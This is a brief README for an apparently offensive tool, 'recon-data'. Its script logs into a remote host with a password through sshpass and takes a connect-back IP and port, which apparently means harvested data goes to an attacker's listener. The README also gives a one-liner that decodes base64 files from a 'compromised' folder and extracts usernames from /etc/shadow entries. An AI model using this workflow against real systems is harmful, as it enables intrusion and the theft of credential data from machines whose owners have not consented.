# recon-data

### remote device needs to have screen installed

### local device needs to sshpass install:

```shell
apt install sshpass
```

## Usage:

### MAKE SURE TO BE IN A NORMAL SHELL!!!!!!!!

```shell
./scrape.sh <user@hostname> <password> <connect-back-ip> <connect-back-port>
```

### get all shadow usernames

```shell
cat compromised/*.b64 | base64 -d | grep -i "^[[:alnum:]]*:.*:[[:alnum:]]*:[[:alnum:]]*:[[:alnum:]]*:[[:alnum:]]*:[[:alnum:]]*:[[:alnum:]]*:" | cut -d ":" -f 1 > usernames.txt 
```
